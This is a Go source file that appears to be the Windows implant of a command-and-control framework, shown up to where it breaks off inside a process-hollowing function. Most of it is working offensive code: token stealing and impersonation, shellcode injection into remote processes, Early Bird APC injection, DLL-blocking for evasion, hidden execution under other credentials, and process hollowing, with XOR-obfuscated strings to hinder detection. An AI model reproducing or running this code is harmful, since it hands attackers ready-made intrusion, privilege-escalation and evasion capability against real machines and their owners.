//go:build windows
// +build windows

package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NETWORK         = 3
	LOGON32_LOGON_BATCH           = 4
	LOGON32_LOGON_SERVICE         = 5
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
	LOGON_WITH_PROFILE            = 1
	LOGON_NETCREDENTIALS_ONLY     = 2

	PROC_CREATE_THREAD     = 0x0002
	PROC_VM_OPERATION      = 0x0008
	PROC_VM_WRITE          = 0x0020
	PROC_QUERY_INFORMATION = 0x0400
	PROC_TERMINATE         = 0x0001
	PROC_DUP_HANDLE        = 0x0040

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_READWRITE          = 0x04
	PAGE_EXECUTE_READ       = 0x20
	PAGE_EXECUTE_READWRITE  = 0x40

	TOKEN_QUERY       = 0x0008
	TOKEN_DUPLICATE   = 0x0002
	TOKEN_IMPERSONATE = 0x0004
	TOKEN_ALL_ACCESS  = 0xF01FF
	SecurityImpersonation = 2
	TokenPrimary          = 1
	TokenElevation        = 20

	SW_HIDE = 0

	TH32CS_SNAPPROCESS = 0x00000002

	STARTF_USESHOWWINDOW = 0x00000001
	CREATE_NO_WINDOW     = 0x08000000
	INFINITE             = 0xFFFFFFFF

	INVALID_HANDLE = ^uintptr(0)
)

type OsVersionInfo struct {
	Major    int
	Minor    int
	Build    int
	FullName string
}

type NetworkAdapter struct {
	Name        string
	Description string
	IP          string
	MAC         string
}

type ProcessInfo struct {
	PID  uint32
	Name string
}

type IntegrityLevel int

const (
	Untrusted IntegrityLevel = 0
	Low       IntegrityLevel = 1
	Medium    IntegrityLevel = 2
	High      IntegrityLevel = 3
	System    IntegrityLevel = 4
)

type ProcessEntry32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

type StartupInfo struct {
	Cb            uint32
	_             *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             *byte
	StdInput      uintptr
	StdOutput     uintptr
	StdErr        uintptr
}

type ProcessInformation struct {
	Process   uintptr
	Thread    uintptr
	ProcessID uint32
	ThreadID  uint32
}

type tokenElevation struct {
	TokenIsElevated uint32
}

var (
	encLgnUsrFail = []byte{0xe6, 0xc4, 0xcf, 0xc6, 0xc0, 0xfa, 0xdf, 0xc8, 0xd0, 0x83, 0xc6, 0xc0, 0xcf, 0xcb, 0xc1, 0xc1, 0x80, 0x9b, 0x9d, 0xdd}
	encImpFail   = []byte{0xe3, 0xc6, 0xd8, 0xcc, 0xdc, 0xdc, 0xc3, 0xc3, 0xc3, 0xd7, 0xc5, 0x81, 0xc0, 0xc6, 0xcd, 0xc9, 0xdf, 0xdf, 0x82, 0x99, 0x9b, 0xdb}
	encImpers    = []byte{0xe3, 0xc6, 0xd8, 0xcc, 0xdc, 0xdc, 0xc3, 0xc3, 0xc3, 0xd7, 0xc5, 0x9b, 0x86, 0x82, 0xc0}
	encOpenPFail = []byte{0xe5, 0xdb, 0xcd, 0xc7, 0xfe, 0xdd, 0xc3, 0xce, 0xc7, 0xd0, 0xd3, 0x81, 0xc0, 0xc6, 0xcd, 0xc9, 0xdf, 0xdf}
	encOpenPSelf = []byte{0xe5, 0xdb, 0xcd, 0xc7, 0xfe, 0xdd, 0xc3, 0xce, 0xc7, 0xd0, 0xd3, 0x81, 0xd5, 0xc2, 0xc8, 0xc3, 0x9a, 0xdd, 0xd9, 0xd0, 0xd2, 0xda, 0xd8}
	encOpenPTok  = []byte{0xe5, 0xdb, 0xcd, 0xc7, 0xfe, 0xdd, 0xc3, 0xce, 0xc7, 0xd0, 0xd3, 0xf5, 0xc9, 0xcc, 0xc1, 0xcb, 0x80, 0x9b, 0x9d, 0xdd}
	encDupTok    = []byte{0xee, 0xde, 0xd8, 0xc5, 0xc7, 0xcc, 0xcd, 0xd9, 0xc7, 0xf7, 0xcf, 0xca, 0xc3, 0xc9, 0x9e, 0x85, 0x9f, 0xdf}
	encRev2Self  = []byte{0xf8, 0xce, 0xde, 0xcc, 0xdc, 0xdb, 0xf8, 0xc2, 0xf1, 0xc6, 0xcc, 0xc7, 0x9c, 0x87, 0x81, 0xc1}
	encValloc    = []byte{0xfc, 0xc2, 0xda, 0xdd, 0xdb, 0xce, 0xc0, 0xec, 0xce, 0xcf, 0xcf, 0xc2, 0x86, 0xc1, 0xc5, 0xcc, 0xd6, 0xde, 0xdc}
	encWPM       = []byte{0xfd, 0xd9, 0xc1, 0xdd, 0xcb, 0xff, 0xde, 0xc2, 0xc1, 0xc6, 0xd3, 0xd2, 0xeb, 0xc2, 0xc9, 0xca, 0xc8, 0xc2, 0x82, 0x99, 0x9b, 0xdb}
	encCRT       = []byte{0xe9, 0xd9, 0xcd, 0xc8, 0xda, 0xca, 0xfe, 0xc8, 0xcf, 0xcc, 0xd4, 0xc4, 0xf2, 0xcf, 0xd6, 0xc0, 0xdb, 0xdf, 0x82, 0x99, 0x9b, 0xdb}
	encSetMP     = []byte{0xf9, 0xce, 0xdc, 0xf9, 0xdc, 0xc0, 0xcf, 0xc8, 0xd1, 0xd0, 0xed, 0xc8, 0xd2, 0xce, 0xc3, 0xc4, 0xce, 0xd2, 0xd7, 0xd7, 0xee, 0xd0, 0xd0, 0xd4, 0xd1, 0xca, 0x8a, 0x91, 0x93, 0xd3}
	encCPWL     = []byte{0xe9, 0xd9, 0xcd, 0xc8, 0xda, 0xca, 0xfc, 0xdf, 0xcd, 0xc0, 0xc5, 0xd2, 0xd5, 0xf0, 0xcd, 0xd1, 0xd2, 0xf7, 0xd7, 0xde, 0xd1, 0xd1, 0x86, 0x9d, 0x97, 0xd7}
	encCTHS     = []byte{0xe9, 0xd9, 0xcd, 0xc8, 0xda, 0xca, 0xf8, 0xc2, 0xcd, 0xcf, 0xc8, 0xc4, 0xca, 0xd7, 0x97, 0x97, 0xe9, 0xd5, 0xd9, 0xc9, 0xcd, 0xd7, 0xd3, 0xc9, 0x92, 0xd5, 0xd1, 0xd8, 0xda, 0xd2, 0xd0}
	encP32F     = []byte{0xfa, 0xd9, 0xc7, 0xca, 0xcb, 0xdc, 0xdf, 0x9e, 0x90, 0xe5, 0xc9, 0xd3, 0xd5, 0xd3, 0x84, 0xc3, 0xdb, 0xd2, 0xd4, 0xdc, 0xda}
	encTPF      = []byte{0xfe, 0xce, 0xda, 0xc4, 0xc7, 0xc1, 0xcd, 0xd9, 0xc7, 0xf3, 0xd2, 0xce, 0xc5, 0xc2, 0xd7, 0xd6, 0x9a, 0xdd, 0xd9, 0xd0, 0xd2, 0xda, 0xd8}
)

func getCurrentProcess() uintptr {
	return INVALID_HANDLE
}

func isElevated() bool {
	var token uintptr
	r1, _, _ := syscall.SyscallN(pOpenProcessToken, getCurrentProcess(), TOKEN_QUERY|TOKEN_DUPLICATE, uintptr(unsafe.Pointer(&token)))
	if r1 == 0 || token == 0 {
		return false
	}
	defer xCloseHandle(token)

	var elev tokenElevation
	var retLen uint32
	r1, _, _ = syscall.SyscallN(pGetTokenInformation, token, TokenElevation, uintptr(unsafe.Pointer(&elev)), unsafe.Sizeof(elev), uintptr(unsafe.Pointer(&retLen)))
	if r1 == 0 {
		return false
	}
	return elev.TokenIsElevated != 0
}

func getOSInfo() OsVersionInfo {
	return OsVersionInfo{
		Major:    10,
		Minor:    0,
		Build:    19041,
		FullName: xorDecrypt([]byte{0xfd, 0xcf, 0xc6, 0xca, 0xc4, 0xc5, 0xd0, 0x80, 0x97, 0x82, 0x94, 0x9c, 0x9f, 0x8e, 0x99, 0x4c, 0x4c, 0x4c}),
	}
}

func getComputerName() string {
	buf := make([]uint16, 64)
	n := uint32(len(buf))
	r1, _, _ := syscall.SyscallN(pGetComputerName, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)))
	if r1 != 0 {
		return syscall.UTF16ToString(buf)
	}
	name, _ := os.Hostname()
	return name
}

func getUsername() string {
	buf := make([]uint16, 64)
	n := uint32(len(buf))
	r1, _, _ := syscall.SyscallN(pGetUserName, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)))
	if r1 != 0 {
		return syscall.UTF16ToString(buf)
	}
	return ""
}

func getProcessID() int {
	return os.Getpid()
}

func GetArchitecture() string {
	if runtime.GOARCH == "amd64" {
		return "x64"
	}
	return "x86"
}

func GetIntegrityLevel() IntegrityLevel {
	if isElevated() {
		return High
	}
	return Medium
}

func GetLocalIPs() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return []string{"127.0.0.1"}
	}
	var ips []string
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	if len(ips) == 0 {
		return []string{"127.0.0.1"}
	}
	return ips
}

func GetProcessList() ([]ProcessInfo, error) {
	var processes []ProcessInfo

	r1, _, _ := syscall.SyscallN(pCreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0)
	snapshot := r1
	if snapshot == INVALID_HANDLE {
		return nil, fmt.Errorf(xorDecrypt(encCTHS))
	}
	defer xCloseHandle(snapshot)

	var entry ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	r1, _, _ = syscall.SyscallN(pProcess32First, snapshot, uintptr(unsafe.Pointer(&entry)))
	if r1 == 0 {
		return nil, fmt.Errorf(xorDecrypt(encP32F))
	}

	for {
		procName := syscall.UTF16ToString(entry.ExeFile[:])
		processes = append(processes, ProcessInfo{
			PID:  entry.ProcessID,
			Name: procName,
		})

		r1, _, _ = syscall.SyscallN(pProcess32Next, snapshot, uintptr(unsafe.Pointer(&entry)))
		if r1 == 0 {
			break
		}
	}

	return processes, nil
}

func KillProcess(pid uint32) error {
	r1, _, _ := syscall.SyscallN(pOpenProcess, PROC_TERMINATE, 0, uintptr(pid))
	handle := r1
	if handle == 0 {
		return fmt.Errorf(xorDecrypt(encOpenPFail))
	}
	defer xCloseHandle(handle)

	r1, _, _ = syscall.SyscallN(pTerminateProcess, handle, 1)
	if r1 == 0 {
		return fmt.Errorf(xorDecrypt(encTPF))
	}
	return nil
}

func MakeToken(username, domain, password string) error {
	uPtr, _ := syscall.UTF16PtrFromString(username)
	dPtr, _ := syscall.UTF16PtrFromString(domain)
	pPtr, _ := syscall.UTF16PtrFromString(password)

	var token uintptr
	r1, _, _ := syscall.SyscallN(pLogonUser,
		uintptr(unsafe.Pointer(uPtr)),
		uintptr(unsafe.Pointer(dPtr)),
		uintptr(unsafe.Pointer(pPtr)),
		LOGON32_LOGON_NEW_CREDENTIALS,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&token)),
	)
	if r1 == 0 {
		return fmt.Errorf(xorDecrypt(encLgnUsrFail), syscall.GetLastError())
	}

	r1, _, _ = syscall.SyscallN(pImpersonateLoggedOnUser, token)
	if r1 == 0 {
		xCloseHandle(token)
		return fmt.Errorf(xorDecrypt(encImpFail), syscall.GetLastError())
	}

	return nil
}

func StealToken(pid uint32) error {
	r1, _, _ := syscall.SyscallN(pOpenProcess, PROC_QUERY_INFORMATION|PROC_DUP_HANDLE, 0, uintptr(pid))
	handle := r1
	if handle == 0 {
		return fmt.Errorf(xorDecrypt(encOpenPFail))
	}
	defer xCloseHandle(handle)

	var token uintptr
	r1, _, _ = syscall.SyscallN(pOpenProcessToken, uintptr(handle), TOKEN_DUPLICATE|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&token)))
	if r1 == 0 {
		return fmt.Errorf(xorDecrypt(encOpenPTok), syscall.GetLastError())
	}

	var dupToken uintptr
	r1, _, _ = syscall.SyscallN(pDuplicateTokenEx,
		uintptr(token),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if r1 == 0 {
		xCloseHandle(token)
		return fmt.Errorf(xorDecrypt(encDupTok), syscall.GetLastError())
	}
	xCloseHandle(token)

	r1, _, _ = syscall.SyscallN(pImpersonateLoggedOnUser, dupToken)
	if r1 == 0 {
		xCloseHandle(dupToken)
		return fmt.Errorf(xorDecrypt(encImpers), syscall.GetLastError())
	}

	return nil
}

func Rev2Self() error {
	r1, _, _ := syscall.SyscallN(pRevertToSelf)
	if r1 == 0 {
		return fmt.Errorf(xorDecrypt(encRev2Self), syscall.GetLastError())
	}
	return nil
}

func SpawnShellcode(sc []byte, pid uint32) (string, error) {
	if pid != 0 {
		r1, _, _ := syscall.SyscallN(pOpenProcess, PROC_CREATE_THREAD|PROC_VM_OPERATION|PROC_VM_WRITE|PROC_QUERY_INFORMATION, 0, uintptr(pid))
		if r1 == 0 {
			return "", fmt.Errorf(xorDecrypt(encOpenPFail))
		}
		addr, _, _ := syscall.SyscallN(pVirtualAlloc, r1, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if addr == 0 {
			xCloseHandle(r1)
			return "", fmt.Errorf(xorDecrypt(encValloc))
		}
		var written uintptr
		syscall.SyscallN(pWriteProcessMemory, r1, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&written)))
		var oldProtect uint32
		syscall.SyscallN(pVirtualProtect, r1, addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
		th, _, _ := syscall.SyscallN(pCreateRemoteThread, r1, 0, 0, addr, 0, 0, 0)
		if th == 0 {
			xCloseHandle(r1)
			return "", fmt.Errorf(xorDecrypt(encCRT), syscall.GetLastError())
		}
		xCloseHandle(th)
		xCloseHandle(r1)
		return fmt.Sprintf("injected into pid %d", pid), nil
	}
	return spawnEarlyBird(sc)
}

const (
	CREATE_SUSPENDED = 0x00000004
)

var (
	encEbCP  = []byte{0xcf, 0xc9, 0x92, 0x89, 0xed, 0xdd, 0xc9, 0xcc, 0xd6, 0xc6, 0xf0, 0xd3, 0xc9, 0xc4, 0xc1, 0xd6, 0xc9, 0x9b, 0xde, 0xd8, 0xd7, 0xd3, 0xd9, 0xd9}
	encEbVA  = []byte{0xcf, 0xc9, 0x92, 0x89, 0xf8, 0xc6, 0xde, 0xd9, 0xd7, 0xc2, 0xcc, 0xe0, 0xca, 0xcb, 0xcb, 0xc6, 0xff, 0xc3, 0x98, 0xdf, 0xdf, 0xd6, 0xd0, 0xd8, 0xd6}
	encEbWPM = []byte{0xcf, 0xc9, 0x92, 0x89, 0xf9, 0xdd, 0xc5, 0xd9, 0xc7, 0xf3, 0xd2, 0xce, 0xc5, 0xc2, 0xd7, 0xd6, 0xf7, 0xde, 0xd5, 0xd6, 0xcc, 0xc6, 0x9c, 0xdb, 0xd3, 0xda, 0xdc, 0xd4, 0xd2}
	encEbAPC = []byte{0xcf, 0xc9, 0x92, 0x89, 0xff, 0xda, 0xc9, 0xd8, 0xc7, 0xf6, 0xd3, 0xc4, 0xd4, 0xe6, 0xf4, 0xe6, 0x9a, 0xdd, 0xd9, 0xd0, 0xd2, 0xda, 0xd8}
	encEbRT  = []byte{0xcf, 0xc9, 0x92, 0x89, 0xfc, 0xca, 0xdf, 0xd8, 0xcf, 0xc6, 0xf4, 0xc9, 0xd4, 0xc2, 0xc5, 0xc1, 0x9a, 0xdd, 0xd9, 0xd0, 0xd2, 0xda, 0xd8}
)

func spawnEarlyBird(sc []byte) (string, error) {
	app := xorDecrypt([]byte{0xd8, 0xde, 0xc6, 0xcd, 0xc2, 0xc3, 0x9f, 0x9f, 0x8c, 0xc6, 0xd8, 0xc4})
	appPtr, _ := syscall.UTF16PtrFromString(app)

	si := &StartupInfo{}
	pi := &ProcessInformation{}

	r1, _, _ := syscall.SyscallN(pCreateProcessW, uintptr(unsafe.Pointer(appPtr)), 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(si)), uintptr(unsafe.Pointer(pi)))
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encEbCP))
	}

	addr, _, _ := syscall.SyscallN(pVirtualAlloc, pi.Process, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if addr == 0 {
		xCloseHandle(pi.Thread)
		xCloseHandle(pi.Process)
		return "", fmt.Errorf(xorDecrypt(encEbVA))
	}

	var written uintptr
	r1, _, _ = syscall.SyscallN(pWriteProcessMemory, pi.Process, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&written)))
	if r1 == 0 {
		xCloseHandle(pi.Thread)
		xCloseHandle(pi.Process)
		return "", fmt.Errorf(xorDecrypt(encEbWPM))
	}

	r1, _, _ = syscall.SyscallN(pQueueUserAPC, addr, pi.Thread, 0)
	if r1 == 0 {
		xCloseHandle(pi.Thread)
		xCloseHandle(pi.Process)
		return "", fmt.Errorf(xorDecrypt(encEbAPC))
	}

	r1, _, _ = syscall.SyscallN(pResumeThread, pi.Thread)
	if r1 == 0xFFFFFFFF {
		xCloseHandle(pi.Thread)
		xCloseHandle(pi.Process)
		return "", fmt.Errorf(xorDecrypt(encEbRT))
	}

	xCloseHandle(pi.Thread)
	xCloseHandle(pi.Process)
	return xorDecrypt([]byte{0xd9, 0xc3, 0xcd, 0xc5, 0xc2, 0xcc, 0xc3, 0xc9, 0xc7, 0x83, 0xc9, 0xcf, 0xcc, 0xc2, 0xc7, 0xd1, 0xdf, 0xdf, 0x98, 0xcf, 0xd7, 0xde, 0x9c, 0xfc, 0xe2, 0xf0, 0x90, 0xd8, 0xd8, 0xc3, 0xdb, 0x95, 0xe4, 0xee, 0xff, 0xa9, 0xfe, 0xfd, 0xe3, 0xee, 0xe7, 0xf0, 0xf3}), nil
}

func BlockDLLs(enable bool) error {
	type ProcessMitigationBinarySignaturePolicy struct {
		Flags uint32
	}

	policy := ProcessMitigationBinarySignaturePolicy{}
	if enable {
		policy.Flags = 1
		policy.Flags |= 0x10000
	}

	r1, _, _ := syscall.SyscallN(pSetProcessMitigationPolicy,
		8,
		uintptr(unsafe.Pointer(&policy)),
		uintptr(unsafe.Sizeof(policy)),
	)
	if r1 == 0 {
		return fmt.Errorf(xorDecrypt(encSetMP), syscall.GetLastError())
	}
	return nil
}

func RunAsUser(username, domain, password string, cmd string) (string, error) {
	cmdLine, _ := syscall.UTF16PtrFromString(cmd)

	si := &StartupInfo{}
	pi := &ProcessInformation{}
	si.Flags = STARTF_USESHOWWINDOW
	si.ShowWindow = SW_HIDE

	uPtr, _ := syscall.UTF16PtrFromString(username)
	dPtr, _ := syscall.UTF16PtrFromString(domain)
	pPtr, _ := syscall.UTF16PtrFromString(password)

	r1, _, _ := syscall.SyscallN(pCreateProcessWithLogon,
		uintptr(unsafe.Pointer(uPtr)),
		uintptr(unsafe.Pointer(dPtr)),
		uintptr(unsafe.Pointer(pPtr)),
		LOGON_WITH_PROFILE,
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encCPWL), syscall.GetLastError())
	}

	defer xCloseHandle(pi.Process)
	defer xCloseHandle(pi.Thread)

	syscall.SyscallN(pWaitForSingleObject, pi.Process, INFINITE)
	var exitCode uint32
	syscall.SyscallN(pGetExitCodeProcess, pi.Process, uintptr(unsafe.Pointer(&exitCode)))

	return fmt.Sprintf(xorDecrypt([]byte{0xc8, 0xd7, 0xcc, 0xda, 0x86, 0xde, 0xc4, 0xdd, 0xc4, 0xcc, 0x86, 0x99, 0x9a, 0x99, 0x9c, 0x84, 0xda, 0xdd}), exitCode), nil
}

func GetDomainInfo() string {
	name, _ := os.Hostname()
	return name
}

func GetNetworkInterfaces() ([]NetworkAdapter, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var adapters []NetworkAdapter
	for _, iface := range interfaces {
		adapter := NetworkAdapter{
			Name:        iface.Name,
			Description: iface.Name,
			MAC:         iface.HardwareAddr.String(),
		}

		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.To4() != nil {
					adapter.IP = ipnet.IP.String()
				}
			}
		}

		if adapter.IP != "" {
			adapters = append(adapters, adapter)
		}
	}

	return adapters, nil
}

const (
	CONTEXT_AMD64 = 0x00100000
	CONTEXT_INTEGER = 0x00000002
	CONTEXT_SEGMENTS = 0x00000004
	CONTEXT_FLOATING_POINT = 0x00000008
	CONTEXT_DEBUG_REGISTERS = 0x00000010
	CONTEXT_FULL = CONTEXT_AMD64 | CONTEXT_INTEGER | CONTEXT_SEGMENTS
	CONTEXT_ALL = CONTEXT_AMD64 | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS

	ProcessBasicInformation = 0
)

type ProcessBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

type Context64 struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

type IMAGE_DOS_HEADER struct {
	Magic uint16
	_     [58]byte
	Lfanew int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]uint8
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

var (
	encPhCP    = []byte{0xda, 0xc3, 0x92, 0x89, 0xed, 0xdd, 0xc9, 0xcc, 0xd6, 0xc6, 0xf0, 0xd3, 0xc9, 0xc4, 0xc1, 0xd6, 0xc9, 0x9b, 0xde, 0xd8, 0xd7, 0xd3, 0xd9, 0xd9}
	encPhCtx   = []byte{0xda, 0xc3, 0x92, 0x89, 0xcd, 0xc0, 0xc2, 0xd9, 0xc7, 0xdb, 0xd4, 0x81, 0xc0, 0xc6, 0xcd, 0xc9, 0xdf, 0xdf}
	encPhQI    = []byte{0xda, 0xc3, 0x92, 0x89, 0xff, 0xda, 0xc9, 0xdf, 0xdb, 0xea, 0xce, 0xc7, 0xc9, 0x87, 0xc2, 0xc4, 0xd3, 0xd7, 0xdd, 0xdd}
	encPhRP    = []byte{0xda, 0xc3, 0x92, 0x89, 0xfc, 0xca, 0xcd, 0xc9, 0xf2, 0xe6, 0xe2, 0x81, 0xc0, 0xc6, 0xcd, 0xc9, 0xdf, 0xdf}
	encPhUnmap = []byte{0xda, 0xc3, 0x92, 0x89, 0xfb, 0xc1, 0xc1, 0xcc, 0xd2, 0x83, 0xc6, 0xc0, 0xcf, 0xcb, 0xc1, 0xc1}
	encPhAlloc = []byte{0xda, 0xc3, 0x92, 0x89, 0xef, 0xc3, 0xc0, 0xc2, 0xc1, 0x83, 0xc6, 0xc0, 0xcf, 0xcb, 0xc1, 0xc1}
	encPhWH    = []byte{0xda, 0xc3, 0x92, 0x89, 0xf9, 0xdd, 0xc5, 0xd9, 0xc7, 0xeb, 0xc5, 0xc0, 0xc2, 0xc2, 0xd6, 0x85, 0xdc, 0xda, 0xd1, 0xd5, 0xdb, 0xdb}
	encPhWS    = []byte{0xda, 0xc3, 0x92, 0x89, 0xf9, 0xdd, 0xc5, 0xd9, 0xc7, 0xf0, 0xc5, 0xc2, 0xd2, 0xce, 0xcb, 0xcb, 0x9a, 0xdd, 0xd9, 0xd0, 0xd2, 0xda, 0xd8}
	encPhSC    = []byte{0xda, 0xc3, 0x92, 0x89, 0xfd, 0xca, 0xd8, 0xee, 0xcd, 0xcd, 0xd4, 0xc4, 0xde, 0xd3, 0x84, 0xc3, 0xdb, 0xd2, 0xd4, 0xdc, 0xda}
	encPhRes   = []byte{0xda, 0xc3, 0x92, 0x89, 0xfc, 0xca, 0xdf, 0xd8, 0xcf, 0xc6, 0x80, 0xc7, 0xc7, 0xce, 0xc8, 0xc0, 0xde}
	encPhBadPE = []byte{0xda, 0xc3, 0x92, 0x89, 0xcc, 0xce, 0xc8, 0x8d, 0xf2, 0xe6}
	encPhLarge = []byte{0xda, 0xc3, 0x92, 0x89, 0xfe, 0xea, 0x8c, 0xd9, 0xcd, 0xcc, 0x80, 0xcd, 0xc7, 0xd5, 0xc3, 0xc0}
)

func ProcessHollowing(peData []byte, processPath string) (string, error) {
	pb := uintptr(unsafe.Pointer(unsafe.SliceData(peData)))

	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(pb))
	if dos.Magic != 0x5A4D {
		return "", fmt.Errorf(xorDecrypt(encPhBadPE))
	}

	ntHdrs := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(pb + uintptr(dos.Lfanew)))
	if ntHdrs.Signature != 0x00004550 || ntHdrs.OptionalHeader.Magic != 0x020B {
		return "", fmt.Errorf(xorDecrypt(encPhBadPE))
	}
	if uint32(len(peData)) < ntHdrs.OptionalHeader.SizeOfImage {
		return "", fmt.Errorf(xorDecrypt(encPhLarge))
	}

	pathPtr, _ := syscall.UTF16PtrFromString(processPath)
	si := &StartupInfo{}
	pi := &ProcessInformation{}

	r1, _, _ := syscall.SyscallN(pCreateProcessW, uintptr(unsafe.Pointer(pathPtr)), 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(si)), uintptr(unsafe.Pointer(pi)))
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhCP))
	}
	defer xCloseHandle(pi.Process)
	defer xCloseHandle(pi.Thread)

	var ctx Context64
	ctx.ContextFlags = CONTEXT_ALL
	r1, _, _ = syscall.SyscallN(pGetThreadContext, pi.Thread, uintptr(unsafe.Pointer(&ctx)))
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhCtx))
	}

	var pbi ProcessBasicInfo
	var retLen uint32
	r1, _, _ = syscall.SyscallN(pNtQueryInformationProcess, pi.Process, ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&retLen)))
	if r1 != 0 {
		return "", fmt.Errorf(xorDecrypt(encPhQI))
	}

	var imageBase uint64
	r1, _, _ = syscall.SyscallN(pReadProcessMemory, pi.Process, pbi.PebBaseAddress+0x10, uintptr(unsafe.Pointer(&imageBase)), 8, 0)
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhRP))
	}

	syscall.SyscallN(pNtUnmapViewOfSection, pi.Process, uintptr(imageBase))

	remoteBase, _, _ := syscall.SyscallN(pVirtualAlloc, pi.Process, uintptr(imageBase), uintptr(ntHdrs.OptionalHeader.SizeOfImage), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if remoteBase == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhAlloc))
	}

	var written uintptr
	r1, _, _ = syscall.SyscallN(pWriteProcessMemory, pi.Process, remoteBase, pb, uintptr(ntHdrs.OptionalHeader.SizeOfHeaders), uintptr(unsafe.Pointer(&written)))
	if r1 == 0 {
		return "", fmt.Errorf(xorDecrypt(encPhWH))
	}

	secBase := pb + uintptr(dos.Lfanew) + uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS64{}))
